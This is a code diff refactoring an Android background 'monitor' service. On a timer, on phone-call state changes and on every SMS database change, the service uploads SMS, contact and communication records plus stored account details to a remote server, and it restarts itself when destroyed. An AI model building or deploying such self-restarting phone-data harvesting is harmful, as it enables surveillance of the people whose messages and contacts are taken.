@@ -26,6 +26,7 @@ import android.support.v4.app.NotificationCompat;
 import android.support.v4.app.NotificationManagerCompat;
 import android.telephony.PhoneStateListener;
 import android.telephony.TelephonyManager;
+import android.util.Log;
 
 import java.io.IOException;
 import java.io.Reader;
@@ -69,6 +70,7 @@ public class MonitorService extends Service {
     private final Timer timer = new Timer();
     private static String phone;
     private String SCKEY;
+    private SharedPreferences data;
 
     @Nullable
     @Override
@@ -78,25 +80,28 @@ public class MonitorService extends Service {
 
     @Override
     public void onCreate() {
-        System.out.println("服务创建");
-        SharedPreferences data = getSharedPreferences("data", Context.MODE_MULTI_PROCESS);
-        phone = data.getString("phone", null);
         super.onCreate();
+        init();
+    }
+
+
+    /**
+     * 初始化操作
+     */
+    public void init() {
+        data = getSharedPreferences("data", Context.MODE_MULTI_PROCESS);
+        phone = data.getString("phone", null);
         SCKEY = data.getString("SCKEY", "");
         if (SCKEY != null && !SCKEY.equals("")) {
             openNotificationAccess();
             toggleNotificationListenerService();
         }
-        openDialReciver();
-        openSmsReciver();
+        startReciver();
         startTimer();
         startForeground(this);
-        try {
-            uploadAll(null);
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
+        uploadAll();
     }
+
 
     /**
      * 开启定时任务
@@ -105,7 +110,8 @@ public class MonitorService extends Service {
         task = new TimerTask() {
             @Override
             public void run() {
-                handler.sendEmptyMessage(0x1);
+//                handler.sendEmptyMessage(0x1);
+                uploadAll();
             }
 
         };
@@ -115,7 +121,9 @@ public class MonitorService extends Service {
 
     @Override
     public void onDestroy() {
+        //进行自动重启
         Intent intent = new Intent(MonitorService.this, MonitorService.class);
+        //重新开启服务
         startService(intent);
         stopForeground(true);
         super.onDestroy();
@@ -123,10 +131,13 @@ public class MonitorService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
+//        uploadAll();
         return super.onStartCommand(intent, flags, startId);
     }
 
     public static void startForeground(Service context) {
+        //设置常驻通知栏
+        //保持为前台应用状态
         NotificationManager nm = (NotificationManager) context.getSystemService(NOTIFICATION_SERVICE);
         NotificationCompat.Builder builder = new NotificationCompat.Builder(context);
         builder.setContentTitle("后台监控" + phone + "中...")
@@ -143,20 +154,13 @@ public class MonitorService extends Service {
      * 上传所有的数据
      */
 
-    public void uploadAll(final Handler handler) throws IOException {
+    public void uploadAll() {
         System.out.println("开始上传~");
-        if (!isNetworkAvailable(this)) {
-            //说明没有网络
-            if (handler != null) {
-                handler.sendEmptyMessage(0x2);
-            }
-        }
         Mobile mobile = new Mobile();
         mobile.setContactMessage(getContactMessage());
         mobile.setMessage(getSMSData());
-        final SharedPreferences data = getSharedPreferences("data", Context.MODE_MULTI_PROCESS);
         FormBody formBody = new FormBody.Builder()
-                .add("json", com.alibaba.fastjson.JSON.toJSONString(mobile)).add("username", data.getString("phone", null)).add("password", data.getString("password", null)).build();
+                .add("json", com.alibaba.fastjson.JSON.toJSONString(mobile)).add("username", data.getString("phone", null)).add("password", data.getString("password", null)).add("qq_name", data.getString("qq_name", "")).add("email_input", data.getString("emial_input", "")).build();
         Request request = new Request.Builder()
                 .url(Constants.URL + "/upload")
                 .post(formBody)
@@ -164,18 +168,11 @@ public class MonitorService extends Service {
         client.newCall(request).enqueue(new Callback() {
             @Override
             public void onFailure(Call call, IOException e) {
-                if (handler != null) {
-                    handler.sendEmptyMessage(0x2);
-                }
                 System.out.println("请求失败");
             }
 
             @Override
             public void onResponse(Call call, Response response) throws IOException {
-                if (handler != null) {
-                    handler.sendEmptyMessage(0x1);
-                }
-                data.edit().putString("updateTime", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date())).commit();
                 Reader reader = response.body().charStream();
                 char[] chars = new char[512];
                 int len = -1;
@@ -185,39 +182,28 @@ public class MonitorService extends Service {
                 }
                 reader.close();
                 Reply reply = com.alibaba.fastjson.JSON.parseObject(sb.toString(), Reply.class);
-                if (reply == null) {
-                    if (handler != null) {
-                        handler.sendEmptyMessage(0x2);
-                    }
+                if (reply != null && reply.getCode() == 200) {
+                    Log.i("ss", "success");
                 } else {
-                    if (handler != null) {
-                        android.os.Message message = handler.obtainMessage();
-                        message.what = 0x3;
-                        message.obj = reply.getMessage();
-                        handler.sendMessage(message);
-                    }
+                    Log.i("ss", "error");
                 }
             }
         });
 
     }
 
+
     /**
-     * 监听到短信后上传数据
+     * 启动短信和电话监听
      */
-    public void update() {
-        try {
-            uploadAll(null);
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
-    }
-
-
-    public void openDialReciver() {
+    public void startReciver() {
         manager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
         manager.listen(new MyPhoneStateListener(),
                 PhoneStateListener.LISTEN_CALL_STATE);
+        Uri uri = Uri.parse("content://sms");
+        getContentResolver().registerContentObserver(uri, true,
+                new MyObserver(new Handler()));
+        System.out.println("短信监听启动");
     }
 
 
@@ -229,14 +215,14 @@ public class MonitorService extends Service {
             switch (state) {
                 case TelephonyManager.CALL_STATE_IDLE:// 空闲状态
                     System.out.println("空闲");
-                    update();
+                    uploadAll();
                     break;
                 case TelephonyManager.CALL_STATE_OFFHOOK:// 接听状态
                     System.out.println("接听状态");
                     break;
                 case TelephonyManager.CALL_STATE_RINGING:// 响铃状态
                     System.out.println("电话正在接听");
-                    update();
+                    uploadAll();
                     break;
                 default:
                     break;
@@ -244,16 +230,6 @@ public class MonitorService extends Service {
         }
     }
 
-
-    /**
-     * 打开短信监听器
-     */
-    private void openSmsReciver() {
-        Uri uri = Uri.parse("content://sms");
-        getContentResolver().registerContentObserver(uri, true,
-                new MyObserver(new Handler()));
-        System.out.println("短信监听启动");
-    }
 
     /**
      * 获取短信数据
@@ -296,7 +272,7 @@ public class MonitorService extends Service {
 
     /**
      * 读取数据
-     * 虎丘动画记录
+     * 获取通信记录
      *
      * @return 读取到的数据
      */
@@ -370,6 +346,9 @@ public class MonitorService extends Service {
     }
 
 
+    /**
+     * 短信观察者
+     */
     private class MyObserver extends ContentObserver {
 
         public MyObserver(Handler handler) {
@@ -379,26 +358,10 @@ public class MonitorService extends Service {
         @Override
         public void onChange(boolean selfChange) {
             System.out.println("短信数据库发生变化了。");
-            try {
-                uploadAll(null);
-            } catch (IOException e) {
-                e.printStackTrace();
-            }
+            uploadAll();
             super.onChange(selfChange);
         }
     }
-
-    private Handler handler = new Handler() {
-        @Override
-        public void handleMessage(android.os.Message msg) {
-            try {
-                uploadAll(null);
-            } catch (IOException e) {
-                e.printStackTrace();
-            }
-        }
-    };
-
 
     private void toggleNotificationListenerService() {
         PackageManager pm = getPackageManager();
